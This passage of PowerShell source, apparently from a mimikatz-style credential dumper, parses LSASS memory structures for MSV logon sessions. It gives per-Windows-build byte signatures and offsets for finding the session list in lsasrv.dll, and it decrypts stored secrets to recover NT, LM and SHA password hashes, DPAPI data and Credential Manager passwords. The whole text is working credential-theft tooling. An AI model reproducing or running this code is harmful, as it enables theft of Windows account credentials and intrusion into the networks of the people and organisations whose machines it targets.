		$StructToWrite["SecondaryLocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["SecondaryLocallyUniqueIdentifier"]
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Type"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Type"]
		$StructToWrite["pSid"] = GetType $Buff $BaseAddr ([ref]$Offset) "PSID"
		$StructToWrite["pSid"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["LogonType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk18"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Session"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["LogonTime"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$StructToWrite["LogonServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonServer"]
		$StructToWrite["Credentials_List_Ptr_Offset"] = $Offset
		$StructToWrite["Credentials_List_Ptr_Func"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
		$StructToWrite["Credentials_List_Ptr"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk24"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk25"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk26"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk27"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk28"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk29"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["CredentialManager"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_MSV1_0_LIST_63($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["hSemaphore6"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["hSemaphore8"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["LocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["LocallyUniqueIdentifier"]
		$StructToWrite["SecondaryLocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["SecondaryLocallyUniqueIdentifier"]
		$StructToWrite["Waza"] = ReadBuff $Buff 12 ([ref]$Offset)
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Type"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Type"]
		$StructToWrite["pSid"] = GetType $Buff $BaseAddr ([ref]$Offset) "PSID"
		$StructToWrite["LogonType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk18"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Session"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["LogonTime"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$StructToWrite["LogonServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonServer"]
		$StructToWrite["Credentials_List_Ptr_Offset"] = $Offset
		$StructToWrite["Credentials_List_Ptr_Func"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
		$StructToWrite["Credentials_List_Ptr"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk24"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk25"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk26"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk27"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk28"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk29"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["CredentialManager"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	$MSVTemplate["Encrypted_Credentials_List_Struct"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
	$MSVTemplate["Encrypted_Credential_Struct"] = (Get-Item "function:KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC").ScriptBlock
	$MSVTemplate["Decrypted_Credential_Struct"] = $Null
	If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
	{
		Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
		return $Null
	}
	ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7)
	{
		$MSVTemplate["List_Entry"] = (Get-Item "function:KIWI_MSV1_0_LIST_60").ScriptBlock
	}
	ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8)
	{
		If ($Dump["MSV1TimeStamp"] -gt 0x53480000)
		{
			$MSVTemplate["List_Entry"] = (Get-Item "function:KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ").ScriptBlock
		}
		Else
		{
			$MSVTemplate["List_Entry"] = (Get-Item "function:KIWI_MSV1_0_LIST_61").ScriptBlock
		}
	}
	ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE)
	{
		If ($Dump["MSV1TimeStamp"] -gt 0x53480000)
		{
			$MSVTemplate["List_Entry"] = (Get-Item "function:KIWI_MSV1_0_LIST_63").ScriptBlock
		}
		Else
		{
			$MSVTemplate["List_Entry"] = (Get-Item "function:KIWI_MSV1_0_LIST_62").ScriptBlock
		}
	}
	Else
	{
		$MSVTemplate["List_Entry"] = (Get-Item "function:KIWI_MSV1_0_LIST_63").ScriptBlock
	}

	If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1507)
	{
		$MSVTemplate["Decrypted_Credential_Struct"] = (Get-Item "function:MSV1_0_PRIMARY_CREDENTIAL_DEC").ScriptBlock
	}
	ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1511)
	{
		$MSVTemplate["Decrypted_Credential_Struct"] = (Get-Item "function:MSV1_0_PRIMARY_CREDENTIAL_10_OLD_DEC").ScriptBlock
	}
	ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1607)
	{
		$MSVTemplate["Decrypted_Credential_Struct"] = (Get-Item "function:MSV1_0_PRIMARY_CREDENTIAL_10_DEC").ScriptBlock
	}
	Else
	{
		$MSVTemplate["Decrypted_Credential_Struct"] = (Get-Item "function:MSV1_0_PRIMARY_CREDENTIAL_10_1607_DEC").ScriptBlock
	}

	If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_INTEL)
	{
		# Processor x86
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
		{
			$MSVTemplate["Signature"] = @(0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd)
			$MSVTemplate["First_Entry_Offset"] = -11
			$MSVTemplate["Offset2"] = -42
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$MSVTemplate["Signature"] = @(0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 18
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_BLUE -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1507))
		{
			$MSVTemplate["Signature"] = @(0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 16
			$MSVTemplate["Offset2"] = -4
		}
		Else
		{
			$MSVTemplate["Signature"] = @(0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 16
			$MSVTemplate["Offset2"] = -4
		}
	}
	ElseIf ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
	{
		# Processor x64
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84)
			$MSVTemplate["First_Entry_Offset"] = 21
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_7 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84)
			$MSVTemplate["First_Entry_Offset"] = 19
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 16
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_BLUE -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1507))
		{
			$MSVTemplate["Signature"] = @(0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05)
			$MSVTemplate["First_Entry_Offset"] = 36
			$MSVTemplate["Offset2"] = -6
		}
		ElseIf (($Global:BUILD_WIN_10_1507 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1703))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 16
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:BUILD_WIN_10_1703 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1803))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 23
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:BUILD_WIN_10_1803 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1903))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 23
			$MSVTemplate["Offset2"] = -4
		}
		ElseIf (($Global:BUILD_WIN_10_1903 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_11_2022))
		{
			$MSVTemplate["Signature"] = @(0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 23
			$MSVTemplate["Offset2"] = -4
		}
		Else
		{
			$MSVTemplate["Signature"] = @(0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74)
			$MSVTemplate["First_Entry_Offset"] = 24
			$MSVTemplate["Offset2"] = -4
		}
	}

	<### MSV Decryptor ###>

	$MSVDecryptor = @{}
	$MSVDecryptor["Decryptor_Template"] = $MSVTemplate
	$MSVDecryptor["Credman_Decryptor_Template"] = $CredmanTemplate
	$MSVDecryptor["LSA_Decryptor"] = $LSADecryptor
	$MSVDecryptor["Entries"] = $Null
	$MSVDecryptor["Entries_Seen"] = $Null
	$MSVDecryptor["Logon_Sessions"] = @{}
	$MSVDecryptor["Logon_Session_Count"] = $Null
	$MSVDecryptor["Current_LogonSession"] = $Null

	<### Functions ###>

	# Callback functions
	# Use same signature : $MSVDecryptor, $Handle, $Pages, $Entry, $EntryAddr

	function Add_Primary_Credentials($MSVDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["Encrypted_Credentials"]["Buffer"])
		If ($Buff)
		{
			$BaseAddr += $OffAddr
			$Encrypted_Credentials_Data = $Buff[$OffAddr..($OffAddr + $Entry["Encrypted_Credentials"]["Length"] - 1)]

			If (@(Compare-Object $Encrypted_Credentials_Data (New-Object byte[] $Entry["Encrypted_Credentials"]["Length"]) -SyncWindow 0).Length -eq 0)
			{
				return
			}

			$DecData = LSADecrypt-Pwd $MSVDecryptor["LSA_Decryptor"] $Encrypted_Credentials_Data $Null $True
			$CredsStruct = @{}

			If (($DecData.Length -eq $MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC_SIZE) -and (@(Compare-Object $DecData[4..7] @(0xcc, 0xcc, 0xcc, 0xcc) -SyncWindow 0).Length -ne 0))
			{
				MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC $DecData $CredsStruct 0
			}
			Else
			{
				$MSVDecryptor["Decryptor_Template"]["Decrypted_Credential_Struct"].Invoke($DecData, $CredsStruct, 0)
			}

			$MSVCredential = @{}
			$MSVCredential["UserName"] = $Null
			$MSVCredential["Domain"] = $Null
			$MSVCredential["NThash"] = $Null
			$MSVCredential["LMHash"] = $Null
			$MSVCredential["SHAHash"] = $Null
			$MSVCredential["DPAPI"] = $Null
			$MSVCredential["isoProt"] = $Null

			If ($CredsStruct["UserName"])
			{
				$Buff = $DecData[$CredsStruct["UserName"]["Buffer"]..($CredsStruct["UserName"]["Buffer"] + $CredsStruct["UserName"]["Length"] - 1)]
				$MSVCredential["UserName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
			}
			If ($CredsStruct["LogonDomainName"])
			{
				$Buff = $DecData[$CredsStruct["LogonDomainName"]["Buffer"]..($CredsStruct["LogonDomainName"]["Buffer"] + $CredsStruct["LogonDomainName"]["Length"] - 1)]
				$MSVCredential["Domain"] = [System.Text.Encoding]::Unicode.GetString($Buff)
			}

			If ($CredsStruct.Keys -Contains "DPAPIProtected")
			{
				$MSVCredential["DPAPI"] = $CredsStruct["DPAPIProtected"]
			}
			If ($CredsStruct.Keys -Contains "isIso")
			{
				$MSVCredential["isoProt"] = $CredsStruct["isIso"][0]
			}

			$MSVCredential["NThash"] = $CredsStruct["NtOwfPassword"]
			If (($CredsStruct["LmOwfPassword"]) -and (@(Compare-Object $CredsStruct["LmOwfPassword"] (New-Object byte[] 16) -SyncWindow 0).Length -ne 0))
			{
				$MSVCredential["LMHash"] = $CredsStruct["LmOwfPassword"]
			}
			$MSVCredential["SHAHash"] = $CredsStruct["ShaOwPassword"]

			$MSVDecryptor["Current_LogonSession"]["MSV_Creds"] += ,($MSVCredential)
		}

		return
	}

	function Add-Credentials($MSVDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		$PrimaryCredentials_Ptr_Loc = $EntryAddr + $Entry["PrimaryCredentials_Ptr_Loc"]
		Walk-List $MSVDecryptor $Handle $Pages $Entry["PrimaryCredentials_Ptr"] $PrimaryCredentials_Ptr_Loc (Get-Item "function:Add_Primary_Credentials").ScriptBlock $Entry["PrimaryCredentials_Ptr_Func"] 0

		return
	}

	function Add-Credman-Credential($MSVDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		$CredmanCredential = @{}
		$CredmanCredential["LUID"] = $Null
		$CredmanCredential["UserName"] = $Null
		$CredmanCredential["Password"] = $Null
		$CredmanCredential["Password_Raw"] = $Null
		$CredmanCredential["Domain"] = $Null

		If ($Entry["User"]["Buffer"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["User"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["User"]["Length"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["User"]["Length"] - 1)]
					$CredmanCredential["UserName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		If ($Entry["Server2"]["Buffer"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["Server2"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["Server2"]["Length"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["Server2"]["Length"] - 1)]
					$CredmanCredential["Domain"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		If (($Entry["cbEncPassword"]) -and ($Entry["cbEncPassword"] -ne 0))
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["encPassword"]
			If ($Buff)
			{
				If ($Entry["cbEncPassword"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["cbEncPassword"] - 1)]
					$CredmanCredential["Password"] = LSADecrypt-Pwd $MSVDecryptor["LSA_Decryptor"] $Buff $CredmanCredential["UserName"] $False
				}
			}
		}

		$CredmanCredential["LUID"] = $MSVDecryptor["Current_LogonSession"]["LUID"]

		$MSVDecryptor["Current_LogonSession"]["Credman_Creds"] += ,($CredmanCredential)

		return
	}

	function Add-Entry($MSVDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		$LogonSession = @{}
		$LogonSession["Authentication_Id"] = $Null
		$LogonSession["Session_Id"] = $Null
		$LogonSession["UserName"] = $Null
		$LogonSession["Domain"] = $Null
		$LogonSession["LogonServer"] = $Null
		$LogonSession["LogonTime"] = $Null
		$LogonSession["SID"] = $Null
		$LogonSession["LUID"] = $Null
		$LogonSession["MSV_Creds"] = @()
		$LogonSession["Wdigest_Creds"] = @()
		$LogonSession["SSP_Creds"] = @()
		$LogonSession["LiveSSP_Creds"] = @()
		$LogonSession["DPAPI_Creds"] = @()
		$LogonSession["Kerberos_Creds"] = @()
		$LogonSession["Credman_Creds"] = @()
		$LogonSession["Tspkg_Creds"] = @()
		$LogonSession["Cloudap_Creds"] = @()

		$LogonSession["Authentication_Id"] = $Entry["LocallyUniqueIdentifier"]["Value"]
		$LogonSession["Session_Id"] = $Entry["Session"]

		$LogonSession["UserName"] = $Null
		If ($Entry["UserName"]["Buffer"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["UserName"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["UserName"]["Length"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["UserName"]["Length"] - 1)]
					$LogonSession["UserName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		$LogonSession["Domain"] = $Null
		If ($Entry["Domain"]["Buffer"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["Domain"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["Domain"]["Length"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["Domain"]["Length"] - 1)]
					$LogonSession["Domain"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		$LogonSession["LogonServer"] = $Null
		If ($Entry["LogonServer"]["Buffer"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["LogonServer"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["LogonServer"]["Length"])
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["LogonServer"]["Length"] - 1)]
					$LogonSession["LogonServer"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		$LogonSession["LogonTime"] = $Null
		If ($Entry["LogonTime"] -ne 0)
		{
			# Convert UNIX timestamp to Windows Filetime
			$EPOCH_AS_FILETIME = 116444736000000000
			$HUNDREDS_OF_NANOSECONDS = 10000000
			$LogonSession["LogonTime"] = (Get-Date 01.01.1970)+([System.TimeSpan]::fromseconds(($Entry["LogonTime"] - $EPOCH_AS_FILETIME) / $HUNDREDS_OF_NANOSECONDS))
		}

		$LogonSession["SID"] = $Null
		If ($Entry["pSid"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["pSid"]
			If ($Buff)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
				$Offset = 0
				$Revision = [UInt32](GetType $Buff $BaseAddr ([ref]$Offset) "Byte")
				$LogonSession["SID"] = ("S-{0}" -f ($Revision))
				$SubAuthorityCount = [UInt32](GetType $Buff $BaseAddr ([ref]$Offset) "Byte")
				$T = ReadBuff $Buff 6 ([ref]$Offset)
				$T = @(0, 0) + $T
				[Array]::Reverse($T)
				$IdentifierAuthority = [System.BitConverter]::ToUint64($T, 0)
				$LogonSession["SID"] += ("-{0}" -f $IdentifierAuthority)
				For ($i = 0; $i -lt $SubAuthorityCount; $i += 1)
				{
					$T = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
					$LogonSession["SID"] += ("-{0}" -f $T)
				}
			}
		}

		$LogonSession["LUID"] = $Entry["LocallyUniqueIdentifier"]["Value"]

		$MSVDecryptor["Current_LogonSession"] = $LogonSession

		If ($Entry["CredentialManager"] -ne 0)
		{
			$Credman_Set_List_Entry = @{}
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["CredentialManager"]
			If ($Buff)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
				$BaseAddr += $OffAddr
				KIWI_CREDMAN_SET_List_Entry $Buff $Credman_Set_List_Entry $BaseAddr

				$List_Starter = @{}
				$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Credman_Set_List_Entry["List1"]
				If ($Buff)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
					$BaseAddr += $OffAddr
					$Credman_Set_List_Entry["List12_Func"].Invoke($Buff, $List_Starter, $BaseAddr)

					$List_Starter_Start_Loc = $BaseAddr + 4 # "Start" field at offset 4 in struct KIWI_CREDMAN_LIST_STARTER
					$List_Starter_Start_Loc += ((AlignAddress $BaseAddr 4) - 4) # "Start" field after alignment. Remove 4 = OffBuff

					If ($List_Starter["Start"] -ne $List_Starter_Start_Loc)
					{
						Walk-List $MSVDecryptor $Handle $Pages $List_Starter["Start"] $List_Starter_Start_Loc ((Get-Item "function:Add-Credman-Credential").ScriptBlock) $MSVDecryptor["Credman_Decryptor_Template"]["List_Entry"] 1
					}
				}
			}
		}

		If ($Entry["Credentials_List_Ptr"] -ne 0)
		{
			$Credentials_List_Ptr_Loc = $EntryAddr + $Entry["Credentials_List_Ptr_Offset"]
			Walk-List $MSVDecryptor $Handle $Pages $Entry["Credentials_List_Ptr"] $Credentials_List_Ptr_Loc ((Get-Item "function:Add-Credentials").ScriptBlock) $Entry["Credentials_List_Ptr_Func"] 0
		}

		$MSVDecryptor["Logon_Sessions"][$MSVDecryptor["Current_LogonSession"]["LUID"]] = $LogonSession

		return
	}

	### Start decrypting ###

	# Find MSV signature address in lsasrv.dll pages
	$SigPos = $Null
	$SigIndexes = $Null
	ForEach ($Module in $Dump["LsassModules"])
	{
		If ($Module["Name"] -eq "lsasrv.dll")
		{
			ForEach ($Page in $Module["Pages"])
			{
				$PageBuff, $SigIndexes = SearchMemory $Dump["LsassHandle"] @($Page) $Page["BaseAddress"] $MSVDecryptor["Decryptor_Template"]["Signature"]
				If ($SigIndexes)
				{
					If ($SigIndexes.Count -gt 1)
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes[0]
					}
					Else
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes
					}

					Break
				}
			}
		}

		If ($SigIndexes) { Break }
	}
	If (-not $SigPos)
	{
		Write-Host ("[-] Unable to find MSV signature into lsasrv.dll module")
		return $Null
	}
	Write-Host ("[+] Found MSV signature at address 0x{0:X8} into lsasrv.dll module. Parsing entries" -f ($SigPos))

	# Get logon session count
	$Addr = $SigPos + $MSVDecryptor["Decryptor_Template"]["Offset2"]
	$MSVDecryptor["Logon_Session_Count"] = 0
